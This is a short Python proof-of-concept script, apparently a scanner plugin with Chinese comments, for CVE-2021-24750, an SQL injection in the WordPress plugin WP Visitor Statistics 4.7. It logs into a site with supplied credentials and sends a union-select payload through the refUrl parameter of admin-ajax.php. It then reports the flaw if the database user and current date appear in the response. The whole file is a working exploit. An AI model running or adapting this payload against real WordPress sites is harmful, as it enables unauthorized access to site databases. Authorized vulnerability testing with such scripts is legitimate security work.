# coding: utf-8
import requests
import datetime

#WordPress Plugin WP Visitor Statistics 4.7 - SQL Injection
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    # Authentication:
    session = requests.Session()
    auth_url=url+'/wp-login.php'
    redirecto = url + "/wp-admin/"
    username=logindict.keys()
    password=logindict.values()
    header = {
        'User-Agent': user_agent
    }
    data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': redirecto, 'testcookie': '1'}
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        auth  = session.post(auth_url, headers=header, data=data, proxies=proxies)
    else:
        auth  = session.post(auth_url, headers=header, data=data)

    sql_cm="'union select 1,1,now(),user()--+"

    #漏洞位置
    exploit_url=url+'/wp-admin/admin-ajax.php?action=refDetails&requests={"refUrl":" '+sql_cm+'"}'

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = session.get(exploit_url, headers=header, proxies=proxies)
    else:
        response = session.get(exploit_url, headers=header)

    retime=datetime.date.today()
    if response.status_code==200 and str(retime) in response.text and '@' in response.text:
        return "WordPress Plugin WP Visitor Statistics 4.7 - SQL注入   漏洞编号：CVE-2021-24750"


def run(url,logindict,user_agent,proxies):
    if logindict:
        result = poc(url,logindict,user_agent,proxies)
        return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','')

